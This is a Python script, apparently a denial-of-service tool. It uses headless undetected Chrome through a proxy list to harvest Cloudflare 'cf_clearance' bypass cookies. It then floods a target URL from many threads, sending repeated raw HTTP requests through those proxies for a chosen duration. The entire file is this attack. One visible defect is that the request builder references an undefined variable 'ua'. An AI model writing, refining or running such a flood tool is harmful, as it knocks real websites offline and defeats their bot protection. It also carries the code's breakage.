# -*- coding: utf-8 -*-

import threading, datetime, time, sys, socket, socks, ssl, requests

import undetected_chromedriver as webdriver

from urllib.parse import urlparse

from colorama import Fore, init

init(convert=True)

def get_cookie(proxy, url, thread_num):

    global failed, success

    options = webdriver.ChromeOptions()

    options.add_argument('--proxy-server={0}'.format(proxy))

    options.add_argument('--no-sandbox')

    options.add_argument('--disable-setuid-sandbox')

    options.add_argument('--disable-infobars')

    options.add_argument('--disable-logging')

    options.add_argument('--disable-login-animations')

    options.add_argument('--disable-notifications')

    options.add_argument('--disable-gpu')

    options.add_argument('--incognito')

    options.add_argument('--headless')

    options.add_argument('--lang=tr_TR')

    options.add_argument("--start-maxmized")

    options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')

    try:

        driver = webdriver.Chrome(options=options)

        driver.get(url)

        driver.implicitly_wait(5)

        tr, loop = 1, 0

        while tr == 1:

            if loop == 60:

                print("#"+str(thread_num)+" Failed : Proxy Connection Error" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]")

                failed += 1

                return

            cookies = driver.get_cookies()

            tryy = 0

            for i in cookies:

                if i['name'] == 'cf_clearance':

                    cookieJAR = driver.get_cookies()[tryy]

                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"

                    driver.quit()

                    tr = 0

                else:

                    tryy += 1

                    pass

            loop += 1

            time.sleep(1)

        driver.quit()

        success += 1

        print(Fore.LIGHTGREEN_EX+"#"+str(thread_num)+" Success : "+proxy+ " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+Fore.RESET)

        try:

            f = open('./cookie.txt', 'a')

            f.write(proxy+"---"+str(cookie)+'\n')

            f.close()

        except:

            pass

    except :

        failed += 1

        print("#"+str(thread_num)+" Failed : Proxy Error" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]")

def r(proxy, cookie, url):

    target = {}

    target['uri'] = urlparse(url).path

    if target['uri'] == "":

        target['uri'] = "/"

    target['host'] = urlparse(url).netloc

    target['scheme'] = urlparse(url).scheme

    if ":" in urlparse(url).netloc:

        target['port'] = urlparse(url).netloc.split(":")[1]

    else:

        target['port'] = "443" if urlparse(url).scheme == "https" else "80"

        pass

    px = proxy.split(":")

    

    thread_count = 0

    while int(thread_count) < int(thr):

        try:

            threading.Thread(target=test, args=(px, cookie, target)).start()

            thread_count += 1

        except:

            pass

def test(px, cookie, target):

    req =  'GET '+target['uri']+' HTTP/1.1\r\n'

    req += 'Host: ' + target['host'] + '\r\n'

    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'

    req += 'Accept-Encoding: gzip, deflate, br\r\n'

    req += 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n'

    req += 'Cache-Control: max-age=0\r\n'

    req += 'Cookie: ' + cookie + '\r\n'

    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'

    req += 'sec-ch-ua-mobile: ?0\r\n'

    req += 'sec-ch-ua-platform: "Windows"\r\n'

    req += 'sec-fetch-dest: empty\r\n'

    req += 'sec-fetch-mode: cors\r\n'

    req += 'sec-fetch-site: same-origin\r\n'

    req += 'Connection: Keep-Alive\r\n'

    req += 'User-Agent: '+ua + '\r\n\r\n\r\n'

    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'

    try:

        if target['scheme'] == 'https':

            packet = socks.socksocket()

            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))

            packet.connect((str(target['host']), int(target['port'])))

            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])

        else:

            packet = socks.socksocket()

            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))

            packet.connect((str(target['host']), int(target['port'])))

    except:

        return

    while (until_time - datetime.datetime.now()).total_seconds() > 0:

        try:

            for _ in range(10):

                packet.send(str.encode(req))

                pass

        except:

            packet.close()

            pass

def main():

    global failed, success, total, until_time, thr

    failed, success, total, thread_num = 0, 0, 0, 0

    url = sys.argv[1]

    until = sys.argv[2]

    proxypath = sys.argv[4]

    thr = sys.argv[3]

    

    f = open('./cookie.txt', 'w')

    f.close()

    for _ in open(proxypath, encoding="utf-8"):

        total += 1

    print("## Start with "+str(total)+" proxies...")

    for line in open(proxypath, encoding="utf-8"):

        line = line.strip()

        thread_num += 1

        threading.Thread(target=get_cookie, args=(line, url, thread_num)).start()

        print("#"+str(thread_num)+" Get cookie => "+line)

        time.sleep(0.5)

    while(failed+success!=total):

        time.sleep(0.2)

    print("# Get Cookie Thread End")

    until_time = datetime.datetime.now() + datetime.timedelta(seconds=int(until))

    if int(success) > 0:

        print(f"# Attack start => {url} for {until} sec")

        for line in open('./cookie.txt', encoding="utf-8"):

            line = line.strip()

            proxyip = line.split('---')[0].split(':')[0]

            proxyport = line.split('---')[0].split(':')[1]

            cookie = line.split('---')[1]

            proxy = str(proxyip)+":"+str(proxyport)

            thd = threading.Thread(target=r, args=(proxy, cookie, url))

            thd.start()

            thd.join()

    else:

        print("# 0 Success")

        sys.exit()

    time.sleep(int(until))

    print("# End attack")

    sys.exit()

if __name__ == '__main__':

    if len(sys.argv) < 5:

        print("")

        sys.exit()

    main()
